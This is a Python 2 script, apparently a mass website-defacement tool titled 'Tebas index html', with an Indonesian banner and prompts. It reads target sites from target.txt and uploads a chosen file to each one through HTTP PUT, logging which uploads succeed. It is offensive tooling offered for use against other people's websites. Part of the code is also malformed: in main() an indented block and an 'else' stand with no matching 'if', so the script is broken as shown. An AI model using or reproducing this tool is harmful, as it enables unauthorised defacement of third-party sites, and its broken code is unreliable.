#coding=utf-8
# Tebas index html
# Github : https://github.com/Rubetu-Xcan
# Youtube : CANDRA - NM
# Mode By Rubetu Xcan

import os,sys,time,re,requests,json
from requests import post
from time import sleep
import itertools
import threading
def textview(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.002)

try:
    import requests, os.path, sys
except ImportError:
    exit('install requests and try again ...')

banner = """\033[1;35m╔╦╗╔═╗╔╦╗╔╦╗╔═╗╔═╗    ╗ ╔╔╦╗╔╦╗═╗
\033[1;35m║║║║ ║ ║  ║ ╠═╣╠╦╝════╠═╣ ║ ║║║ ║
\033[1;35m╩ ╩╚═╝ ╩  ╩ ╩ ╩╩╚═    ╝ ╚ ╩ ╩ ╩ ╚═╝ V 1.0
\033[1;30m-------------------------------------------
\033[1;37m[\033[1;32m•\033[1;37m] Author \033[1;31m: \033[1;96mRubetu Xcan
\033[1;37m[\033[1;32m•\033[1;37m] Youtube\033[1;31m: \033[1;96mCANDRA - NM
\033[1;37m[\033[1;32m•\033[1;37m] Github\033[1;31m : \033[1;32mhttps://github.com/Rubetu-Xcan
\033[1;30m-------------------------------------------
\033[1;37m[\033[1;32m+\033[1;37m]\033[1;33m Tebas index html
\033[1;37m[\033[1;32m+\033[1;37m]\033[1;33m Support website voln
\033[1;37m[\033[1;32m+\033[1;37m]\033[1;33m Selalu check update script!
\033[1;30m-------------------------------------------"""

b = '\x1b[31m'
h = '\x1b[32m'
m = '\x1b[00m'

def x(tetew):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(tetew)
    else:
        ipt = raw_input(tetew)
    return str(ipt)


def aox(script, target_file='target.txt'):
    op = open(script, 'r').read()
    with open(target_file, 'r') as (target):
        target = target.readlines()
        s = requests.Session()
        print '\n \x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;92muploading file to \x1b[1;91m%d \x1b[1;92mwebsite' % len(target)
        for web in target:
            try:
                site = web.strip()
                if site.startswith('http://') is False:
                    site = 'http://' + site
                req = s.put(site + '/' + script, data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print ' ' + m + '[' + b + ' FAILED!' + m + ' ] %s/%s' % (site, script)
                else:
                    print ' ' + m + '[' + h + ' SUCCESS' + m + ' ] %s/%s' % (site, script)
            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print
                exit()

def main(__bn__):
    print __bn__
    while True:
        try:
            print ' \033[1;37m[\033[1;32m+\033[1;37m] \x1b[1;96mNote\x1b[1;91m: \x1b[1;92mscript harus berada di dalam\n           directory ini'
            a = raw_input(' \033[1;37m[\033[1;32m+\033[1;37m]\033[1;33m Masukan nama script \033[1;31m>>\033[0;32m ')
            fileopen = open(a).read()
                print ' \x1b[1;97m[\x1b[1;96m!\x1b[1;97m] \x1b[1;91mFile \x1b[1;97m%s\x1b[1;91m tidak di temukan' % a
                continue
            else:
                break
        except KeyboardInterrupt:
            print
            exit()

    aox(a)

if __name__ == '__main__':
    os.system('clear')
main(banner)





